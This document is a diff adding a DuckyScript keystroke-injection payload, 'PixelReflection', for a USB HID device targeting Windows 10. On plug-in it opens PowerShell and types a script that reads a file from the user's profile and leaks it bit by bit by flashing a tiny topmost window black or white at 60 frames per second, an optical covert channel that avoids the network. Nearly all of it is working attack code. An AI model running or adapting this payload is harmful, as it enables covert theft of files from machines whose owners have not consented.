@@ -1,0 +1,75 @@
+REM Title: PixelReflection
+REM Author: Cribbit
+REM Description: Creates a form and changes the background to black or white to represent the bits of a file.
+REM Target: Windows 10
+
+ATTACKMODE HID
+REM Frames per secound
+DEFINE #FPS 60
+REM form position
+DEFINE #TOP 0
+DEFINE #LEFT 0
+REM form size 1x1 px
+DEFINE #HEIGHT 1
+DEFINE #WIDTH 1
+REM File to send (suggest a small file)
+DEFINE #FILE $env:USERPROFILE\test.jpg
+
+REM kducky: stripped EXTENSION DETECT_READY (not executed on Pico)
+
+DELAY 500
+GUI r
+DELAY 200
+STRINGLN powershell
+DELAY 500
+STRINGLN <# Load .Net forms assembly #> `
+STRINGLN [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms");`
+STRINGLN Add-Type -Assembly PresentationFramework;`
+STRINGLN <# Set up speed / sleep time in mills #> `
+STRINGLN $fps = #FPS;`
+STRINGLN $mills = 1000/$fps;`
+STRINGLN <# set the xml for the WPF form #> `
+STRINGLN [xml]$xaml = @"`
+STRINGLN <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+STRINGLN Width="#WIDTH" Height="#HEIGHT" Left="#LEFT" Top="#TOP"
+STRINGLN WindowStyle="None" Background="Red" Topmost="True" ShowInTaskbar="False" ResizeMode="NoResize"/>
+STRINGLN "@;`
+STRINGLN <# Read the xml #> `
+STRINGLN $reader = (New-Object System.Xml.XmlNodeReader $xaml);`
+STRINGLN <# Create the windows form #> `
+STRINGLN $window = [Windows.Markup.XamlReader]::Load($reader);`
+STRINGLN <# Create a timer that will run when the form is shown #> `
+STRINGLN $timer = New-Object System.Windows.Forms.Timer;`
+STRINGLN $timer.Interval = 5;`
+STRINGLN Function Timer_Tick()
+STRINGLN {
+STRINGLN     $timer.Stop();
+STRINGLN     Start-Sleep -Milliseconds $mills;
+STRINGLN     <#  Get the content of the file encoded as bytes
+STRINGLN         for each byte step though 7 to 0
+STRINGLN         shift left 1 by n (7to0) see if this bit is set in the byte
+STRINGLN         if true set the background to white else to black
+STRINGLN     #>
+STRINGLN     Get-Content #FILE -En By | % {`
+STRINGLN         $b=$_;7..0 | % {`
+STRINGLN             if($b-band(1-shl$_))
+STRINGLN             {`
+STRINGLN                 $window.Background = "White";`
+STRINGLN             }`
+STRINGLN             else`
+STRINGLN             {`
+STRINGLN                 $window.Background = "Black";`
+STRINGLN             }`
+STRINGLN             $window.Dispatcher.Invoke([action]{}, "Render");`
+STRINGLN             Start-Sleep -Milliseconds $mills;`
+STRINGLN         }`
+STRINGLN     };`
+STRINGLN     $window.Background = "Green";`
+STRINGLN     $window.Dispatcher.Invoke([action]{}, "Render");`
+STRINGLN     Start-Sleep -Milliseconds $mills;`
+STRINGLN     $window.Close();`
+STRINGLN };`
+STRINGLN $window.Add_Loaded({$timer.Start()});`
+STRINGLN $timer.Add_Tick({Timer_Tick});`
+STRINGLN <# Show the wpf window as a dialog so it is blocking #> `
+STRINGLN [void]$window.ShowDialog();
